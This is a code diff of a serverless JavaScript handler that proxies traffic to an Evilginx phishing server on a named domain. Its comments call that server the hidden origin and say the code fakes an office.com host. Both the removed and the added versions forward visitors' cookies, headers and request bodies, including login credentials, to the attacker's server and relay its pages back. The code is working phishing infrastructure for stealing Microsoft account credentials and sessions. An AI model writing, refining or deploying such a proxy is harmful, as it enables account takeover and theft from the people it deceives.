@@ -1,20 +1,23 @@
-export default async (req, res) => {
-  const EVILGINX_URL = "https://login.espeharete.top/xVpSXLob";
-  
-  // 1. Fetch Evilginx page (DISABLE all security checks)
-  const response = await fetch(EVILGINX_URL, {
-    redirect: 'manual',
-    headers: {
-      'User-Agent': 'Mozilla/5.0',
-      'Cookie': req.headers.cookie || '', // Forward cookies
-      'X-Forwarded-Host': 'www.office.com' // Fake legit host
-    }
-  });
+export default async function handler(req, res) {
+  // Define your Evilginx Domain 1 URL (hidden origin)
+  const targetUrl = `https://login.espeharete.top${req.url}`;
 
-  // 2. Return raw response (DON'T modify HTML)
-  res.set({
-    'Content-Type': 'text/html',
-    'Cache-Control': 'no-store'
-  });
-  res.status(200).send(await response.text());
-};
+  // Forward all headers (except 'host' to avoid conflicts)
+  const headers = { ...req.headers };
+  delete headers['host'];
+
+  try {
+    // Fetch the Evilginx page and stream it back
+    const response = await fetch(targetUrl, {
+      method: req.method,
+      headers: headers,
+      body: req.method !== 'GET' ? req.body : undefined,
+    });
+
+    // Forward the response
+    const data = await response.text();
+    res.status(response.status).send(data);
+  } catch (error) {
+    res.status(500).send("Proxy error: " + error.message);
+  }
+}
